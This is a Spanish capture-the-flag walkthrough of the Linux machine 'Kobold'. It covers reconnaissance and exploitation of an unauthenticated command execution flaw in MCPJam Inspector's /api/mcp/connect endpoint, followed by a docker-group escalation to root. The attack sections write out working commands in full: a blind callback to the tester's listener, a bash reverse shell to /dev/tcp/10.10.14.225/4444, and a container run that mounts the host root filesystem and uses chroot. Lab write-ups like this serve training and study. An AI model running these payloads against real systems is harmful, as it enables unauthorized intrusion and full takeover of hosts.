
**Dificultad:** Easy **Sistema Operativo:** Linux **Categorías:** API Exploitation, Docker, RCE

---

## Resumen

Kobold es una máquina Linux Easy centrada en la explotación de una API sin autenticación y el abuso de permisos de grupo mal configurados sobre el socket de Docker. La cadena de ataque completa consiste en:

1. Descubrir subdominios ocultos mediante fuzzing de vhosts.
2. Identificar una instancia de **Arcane Docker Management** (basada en MCPJam Inspector) vulnerable a **CVE-2026-23520**, una RCE no autenticada.
3. Obtener una reverse shell como el usuario `ben` a través del endpoint `/api/mcp/connect`.
4. Escalar privilegios abusando de la pertenencia (inactiva) de `ben` al grupo `docker`, usando `newgrp` para reactivarla.
5. Montar el filesystem del host dentro de un contenedor y hacer `chroot` para obtener una shell como root.

---

## 1. Reconocimiento

### 1.1 Escaneo de puertos

Arrancamos con un escaneo de Nmap sobre los puertos habituales:

```bash
nmap -sC -sV -p22,80,443,3552 -oN escaneo 10.129.245.50
```

**Resultado:**

|Puerto|Servicio|Detalle|
|---|---|---|
|22/tcp|SSH|OpenSSH 9.6p1 (Ubuntu)|
|80/tcp|HTTP|nginx 1.24.0 — redirige a `https://kobold.htb/`|
|443/tcp|HTTPS|nginx 1.24.0 — certificado con SAN `kobold.htb`, `*.kobold.htb`|

El certificado TLS incluye un wildcard (`*.kobold.htb`), lo que sugiere la existencia de subdominios adicionales.


### 1.2 Descubrimiento de subdominios (vhosts)

Agregamos `kobold.htb` a `/etc/hosts` y realizamos fuzzing de vhosts con `gobuster`:

```bash
gobuster vhost -u "https://kobold.htb" \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt \
  --append-domain --no-tls-validation -t 200
```

**Resultado:**

```
mcp.kobold.htb Status: 200 [Size: 466]
bin.kobold.htb Status: 200 [Size: 24402]
```

Agregamos ambos subdominios a `/etc/hosts`:

```
10.129.245.50 kobold.htb mcp.kobold.htb bin.kobold.htb
```


### 1.3 Análisis de los sitios encontrados

|Subdominio|Servicio|Descripción|
|---|---|---|
|`kobold.htb`|Kobold Operations Suite|Landing page corporativa (email de contacto: `admin@kobold.htb`)|
|`bin.kobold.htb`|PrivateBin|Pastebin cifrado de código abierto|
|`mcp.kobold.htb`|Arcane Docker Management (MCPJam Inspector)|Panel de administración/inspección de servidores MCP (Model Context Protocol)|

El título de la página en `mcp.kobold.htb` (`MCPJam Inspector`) y las rutas de su bundle JavaScript confirman que se trata de una instancia de **MCPJam Inspector**, una herramienta de desarrollo para servidores MCP:

```bash
curl -s -k https://mcp.kobold.htb/assets/index-DRYhT9Xb.js -o inspector.js
grep -oE '"/api/[a-zA-Z0-9/_-]*"' inspector.js | sort -u
```

Esto reveló una API extensa bajo `/api/mcp/*`, incluyendo endpoints como:

```
/api/mcp/connect
/api/mcp/tools/execute
/api/mcp/servers
/api/mcp/health
```

También confirmamos que la API está activa y responde:

```bash
curl -s -k https://mcp.kobold.htb/api/mcp/health
# {"service":"MCP API","status":"ready","timestamp":"..."}
```


---

## 2. Análisis de la vulnerabilidad

Una búsqueda sobre vulnerabilidades conocidas en MCPJam Inspector / Arcane Docker Management llevó a **CVE-2026-23520** (relacionada con la más ampliamente documentada CVE-2026-23744, del mismo proyecto).

|CVE|Servicio|Versión afectada|Impacto|Severidad|
|---|---|---|---|---|
|CVE-2026-23520 / CVE-2026-23744|MCPJam Inspector / Arcane Docker Management|≤ 1.4.2|RCE no autenticada vía `/api/mcp/connect`|Crítica (CVSS 9.8)|

### 2.1 Causa raíz

El endpoint `/api/mcp/connect` está diseñado para permitir que la herramienta se conecte a servidores MCP arbitrarios, especificando cómo lanzarlos:

```json
{
  "serverId": "id-cualquiera",
  "serverConfig": {
    "command": "comando-a-ejecutar",
    "args": ["arg1", "arg2"],
    "env": {}
  }
}
```

El problema es doble:

1. **Sin autenticación**: cualquier cliente en la red puede llamar a este endpoint.
2. **Sin validación de entrada**: el valor de `command` se ejecuta directamente como proceso del sistema, sin restringir a binarios de servidores MCP legítimos.

Además, el servicio escucha por defecto en `0.0.0.0` en lugar de `127.0.0.1`, lo que expone el endpoint vulnerable a toda la red en vez de limitarlo a uso local — agravando significativamente el impacto.

---

## 3. Explotación — Reverse Shell (CVE-2026-23520)

### 3.1 Confirmación de RCE

Antes de lanzar una reverse shell, confirmamos la ejecución de comandos de forma "ciega" (la API no devuelve la salida del comando) haciendo que el servidor víctima hiciera una petición HTTP saliente hacia un listener propio:

```bash
# Listener en nuestra máquina
python3 -m http.server 8000
```

```bash
curl -k https://mcp.kobold.htb/api/mcp/connect \
  -H "Content-Type: application/json" \
  --data '{"serverConfig":{"command":"curl","args":["http://10.10.14.225:8000/rce-test"],"env":{}},"serverId":"test2"}'
```

El listener HTTP recibió la petición `GET /rce-test` desde la IP de la máquina, confirmando ejecución de comandos en el servidor.


### 3.2 Reverse shell

Con la RCE confirmada, lanzamos un listener con `netcat` y disparamos el payload final:

```bash
nc -lvnp 4444
```

```bash
curl -k https://mcp.kobold.htb/api/mcp/connect \
  -H "Content-Type: application/json" \
  --data '{"serverConfig":{"command":"bash","args":["-c","bash -i >& /dev/tcp/10.10.14.225/4444 0>&1"],"env":{}},"serverId":"test3"}'
```

Obtuvimos conexión inmediata como el usuario `ben`:

```
connect to [10.10.14.225] from (UNKNOWN) [10.129.245.50] 39464
bash: cannot set terminal process group (1544): Inappropriate ioctl for device
bash: no job control in this shell
ben@kobold:/usr/local/lib/node_modules/@mcpjam/inspector$
```


### 3.3 Estabilización de la shell

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

---

## 4. Flag de usuario

```bash
ben@kobold:~$ cat user.txt
```


---

## 5. Escalada de privilegios — Abuso del socket de Docker

### 5.1 Enumeración

Revisando la identidad activa del usuario:

```bash
ben@kobold:~$ id
uid=1001(ben) gid=1001(ben) groups=1001(ben),37(operator)
```

A primera vista, `ben` no pertenece al grupo `docker`, y el intento directo de usar Docker falla:

```bash
ben@kobold:~$ docker ps
permission denied while trying to connect to the Docker daemon socket at unix:///var/run/docker.sock: ...
```

Sin embargo, al revisar `/etc/group` directamente (no solo la sesión activa), se observa que `ben` **sí está listado como miembro del grupo `docker`**:

```bash
cat /etc/group | grep docker
# docker:x:999:ben
```

### 5.2 Causa del comportamiento

La discrepancia ocurre porque el proceso Node.js que ejecuta el comando de la reverse shell (a través de la RCE de MCPJam Inspector) no recalculó los grupos suplementarios del usuario `ben` al momento de generar el subproceso. La sesión heredó únicamente los grupos que tenía cargados el proceso padre en memoria, sin refrescar la lista completa desde `/etc/group`.

`newgrp` fuerza una nueva sesión de login de grupo, releyendo la membresía real del usuario:

```bash
ben@kobold:~$ newgrp docker
ben@kobold:~$ docker ps
CONTAINER ID   IMAGE                                COMMAND                  CREATED        STATUS             PORTS                      NAMES
4c49dd7bb727   privatebin/nginx-fpm-alpine:2.0.2   "/etc/init.d/rc.local"   5 months ago   Up About an hour   127.0.0.1:8080->8080/tcp   bin
```


### 5.3 Escape a root vía montaje del filesystem del host

Tener acceso al socket de Docker (`/var/run/docker.sock`) equivale, en la práctica, a tener privilegios de **root sobre el host**: el daemon de Docker corre como root y ejecuta cualquier instrucción que se le pida, incluyendo montar rutas arbitrarias del host dentro de un contenedor.

Usamos la imagen de PrivateBin ya presente en el sistema para levantar un contenedor como root (`-u 0`), montando la raíz (`/`) del host en `/mnt`:

```bash
docker run --rm -it -u 0 --entrypoint sh -v /:/mnt privatebin/nginx-fpm-alpine:2.0.2
```

Una vez dentro del contenedor, usamos `chroot` para pivotar hacia el filesystem del host montado en `/mnt`:

```bash
/var/www # chroot /mnt sh
# id
uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)
```

Con esto obtuvimos una shell con privilegios completos de root **directamente sobre el sistema de archivos real de la máquina**, no sobre el contenedor.


---

## 6. Flag de root

```bash
cd /root
ls
arcane_linux_amd64  data  root.txt
cat root.txt

```

Como dato adicional, el binario `arcane_linux_amd64` presente en `/root` corresponde al backend de **Arcane Docker Management**, confirmando que el servicio vulnerable corría con privilegios de root en el host (visible también en el listado de procesos como `/root/arcane_...`).

---
